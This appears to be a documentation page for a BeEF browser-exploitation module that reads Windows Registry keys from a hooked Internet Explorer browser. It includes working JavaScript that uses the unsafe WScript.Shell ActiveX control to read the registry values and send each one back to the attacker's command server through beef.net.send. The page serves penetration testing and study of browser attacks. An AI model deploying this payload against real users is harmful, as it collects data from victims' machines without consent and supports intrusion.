## Summary

* **Objective**: get registry keys of a Windows system
* **Authors**: bcoles
* **Browsers**: IE

* [Code](https://github.com/beefproject/beef/tree/master/modules/host/get_registry_keys)

## Internal Working

Retrieves the values of Windows Registry keys using an (unsafe) ActiveX control. 

Internet Explorer does NOT allow scripting of unsafe ActiveX controls in the Internet zone by default.

Each registry key must be placed on a new line.

uses the Wscript.Shell object to do so

```js
var wsh = new ActiveXObject("WScript.Shell");
if (!wsh) throw("failed to create registry object");
else {
        for (var i=0; i<key_paths.length; i++) {
                var key_path = key_paths[i];
                if (!key_path) continue;
                try {
                        var key_value = wsh.RegRead(key_path);
                        result = key_path+": "+key_value;
                } catch (e) {
                        result = key_path+": failed to retrieve key value";
                }
                beef.net.send('<%= @command_url %>', <%= @command_id %>, 'key_values='+result);
        }
}
```


## Feedback
